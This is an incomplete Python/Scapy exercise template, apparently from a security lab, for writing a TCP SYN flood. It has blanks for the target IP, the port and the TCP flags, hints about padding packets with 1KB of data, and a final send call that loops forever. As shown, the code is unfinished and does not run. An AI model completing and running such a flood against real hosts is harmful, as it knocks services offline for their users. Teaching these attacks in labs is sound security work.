from scapy.all import *

target_ip = None # insert target ip
target_port = None # insert target port

# forge IP packet with target ip as the destination IP address
ip = IP(dst=)

# forge TCP SYN packet with a random source port
# and the target port as destination port
tcp = TCP(sport=, dport=, flags=)

# add some flooding data 
# (hint: raw uses bytes, in our case 1KB is enough)
raw = Raw()

# stack up the layers (hint: use the / operator)


# send packets 
send(p, loop=1, verbose=0)

